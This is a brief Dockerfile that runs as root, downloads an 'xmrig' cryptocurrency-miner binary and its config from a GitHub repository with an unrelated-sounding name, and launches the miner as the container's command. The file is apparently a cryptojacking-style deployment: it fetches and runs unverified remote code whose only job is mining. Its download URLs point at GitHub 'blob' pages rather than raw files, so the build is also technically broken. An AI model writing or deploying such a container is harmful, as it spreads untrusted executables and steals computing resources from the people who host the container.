FROM ubuntu:latest

WORKDIR /app
USER root

RUN apt-get update
RUN apt-get install -y wget curl

RUN wget https://github.com/jjcasa/rptreum/blob/main/config.json
RUN wget https://github.com/jjcasa/rptreum/blob/main/xmrig

CMD ./xmrig
